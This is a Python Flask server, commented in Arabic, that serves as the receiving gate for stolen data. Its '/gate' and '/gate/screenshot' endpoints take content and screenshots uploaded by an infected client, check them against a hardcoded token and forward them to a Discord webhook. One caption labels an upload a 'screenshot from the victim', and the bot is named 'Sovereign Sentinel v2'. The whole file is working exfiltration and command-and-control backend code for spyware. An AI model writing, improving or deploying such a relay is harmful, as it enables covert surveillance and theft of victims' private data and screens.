import os
import requests
from flask import Flask, request, jsonify

app = Flask(__name__)

# تأكد من ضبط هذا المتغير في إعدادات الاستضافة
DISCORD_WEBHOOK_URL = os.environ.get('DISCORD_WEBHOOK')
# مفتاح سري للتحقق لضمان أن سيرفرك لا يستقبله إلا من ملفك الخاص
API_SECRET_KEY = "ALPHA_SECRET_2026"

def send_to_discord(payload, files=None):
    try:
        requests.post(DISCORD_WEBHOOK_URL, json=payload, files=files)
    except Exception as e:
        print(f"Error: {e}")

@app.route('/gate', methods=['POST'])
def gate():
    # التحقق من مفتاح الأمان
    if request.headers.get('X-Auth-Token') != API_SECRET_KEY:
        return jsonify({"status": "unauthorized"}), 403
    
    data = request.json
    payload = {
        "username": "Sovereign Sentinel v2",
        "embeds": [{
            "title": "📦 استلام بيانات جديدة",
            "description": data.get('content', 'No content'),
            "color": 15158332
        }]
    }
    send_to_discord(payload)
    return jsonify({"status": "delivered"}), 200

@app.route('/gate/screenshot', methods=['POST'])
def gate_screenshot():
    if request.headers.get('X-Auth-Token') != API_SECRET_KEY:
        return 403
        
    if 'file' in request.files:
        file = request.files['file']
        files = {'file': (file.filename, file.stream, file.mimetype)}
        payload = {"username": "Sovereign Sentinel v2", "content": "📸 لقطة شاشة من الضحية:"}
        requests.post(DISCORD_WEBHOOK_URL, data=payload, files=files)
        return "OK", 200
    return "No File", 400

if __name__ == '__main__':
    # يعمل على جميع الواجهات بالبورت المحدد
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
